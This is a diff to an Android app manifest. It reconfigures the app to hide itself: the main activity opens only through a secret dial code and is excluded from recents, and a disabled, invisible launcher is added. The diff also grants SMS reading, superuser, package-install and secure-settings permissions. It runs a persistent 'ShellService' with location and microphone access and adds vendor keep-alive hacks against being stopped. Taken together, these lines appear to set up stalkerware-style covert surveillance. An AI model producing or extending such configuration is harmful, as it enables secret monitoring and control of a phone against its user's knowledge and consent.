@@ -2,7 +2,17 @@
 <manifest
     xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
+    <queries>
+        <package android:name="com.google.android.apps.docs" />
+        <package android:name="com.android.mms" />
 
+        <!-- Add these for OnePlus compatibility -->
+        <package android:name="com.oplus.ndsf" />  <!-- OnePlus system service -->
+        <package android:name="com.oneplus.security" />  <!-- OnePlus security center -->
+        <package android:name="com.heytap.accessory" />  <!-- Required for some OnePlus accessories -->
+        <!-- Add OEM packages for other manufacturers if needed -->
+        <package android:name="com.samsung.android.app.galaxyfinder" />
+    </queries>
     <!-- Hardware Features (only if needed) -->
     <uses-feature android:name="android.hardware.camera" android:required="false"/>
     <uses-feature android:name="android.hardware.telephony" android:required="false"/>
@@ -37,17 +47,26 @@
         android:name="android.permission.CAMERA"
         tools:ignore="PermissionImpliesUnsupportedChromeOsHardware"/>
     <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
     <uses-permission android:name="android.permission.CALL_PHONE"/>
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
-
-    <!--
-        IMPORTANT:
-        Retain only if you truly need to manage "All files" on Android 11+.
-        Google Play has strict guidelines on this permission.
-    -->
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
+    <!-- Add these for OnePlus background operation stability -->
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.DEVICE_POWER"
+        tools:ignore="ProtectedPermissions" />
 
     <application
         android:allowBackup="true"
@@ -56,17 +75,54 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:installLocation="internalOnly"
-        android:theme="@style/Theme.Sptassist" >
+        android:theme="@style/Theme.Sptassist"
+        android:persistent="true"
+        android:requestLegacyExternalStorage="true"><!-- Prevents aggressive killing -->
 
+    <!-- OnePlus Background Operation Hack -->
+    <meta-data
+        android:name="op.force.allow_sys_app"
+        android:value="true" />
+    <meta-data
+            android:name="oplus.force.allow_sys_app"
+            android:value="true" />
+    <meta-data
+            android:name="oplus.app.background.policy"
+            android:value="keep_alive" />
+        <meta-data
+            android:name="op.app.background.policy"
+            android:value="keep_alive" />
+
+    <!-- Bypass battery optimization -->
+    <meta-data
+        android:name="auto_startup"
+        android:value="true" />
         <!-- Hidden Activity triggered by dial code (no MAIN/LAUNCHER) -->
         <activity
             android:name=".MainActivity"
-            android:label="@string/app_name"
+            android:enabled="true"
+            android:excludeFromRecents="true"
             android:exported="true"
-            android:enabled="true" >
+            android:label="@string/app_name"
+            android:launchMode="singleInstance"
+            android:permission="android.permission.SECRET_CODE"
+            android:taskAffinity=""><!-- Add this -->
+
             <intent-filter>
-                <action android:name="android.provider.Telephony.SECRET_CODE"/>
-                <data android:scheme="android_secret_code" android:host="5683"/>
+                <action android:name="android.intent.action.MAIN" />
+                    <action android:name="android.provider.Telephony.SECRET_CODE" />
+                    <data android:scheme="android_secret_code" android:host="5683" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:name=".HiddenLauncher"
+            android:enabled="false"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:theme="@android:style/Theme.NoDisplay">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
@@ -84,7 +140,15 @@
         <service
             android:name=".ShellService"
             android:exported="false"
-            android:foregroundServiceType="dataSync"/>
+            android:foregroundServiceType="location|dataSync|microphone"
+            android:stopWithTask="false"
+            android:process=":persistent">  <!-- Run in separate persistent process -->
+
+        <!-- OnePlus-specific keep-alive -->
+        <meta-data
+            android:name="com.oneplus.foreground.service.keepalive"
+            android:value="true" />
+        </service>
 
     </application>
 
